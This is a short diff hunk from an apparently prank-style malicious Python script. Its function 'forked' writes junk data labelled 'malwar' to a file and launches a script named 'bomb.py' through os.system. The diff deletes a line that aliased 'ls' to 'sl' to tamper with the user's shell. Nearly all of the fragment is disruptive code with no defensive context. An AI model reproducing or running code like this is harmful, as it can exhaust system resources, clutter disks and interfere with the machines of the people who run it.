@@ -23,7 +23,6 @@ def forked():
       file.write(malwar + str(random.randbytes(999)))
     print(malwar)
     os.system("python bomb.py")
-    os.system('alias ls="sl"')
     
 @atexit.register
 def goodbye():
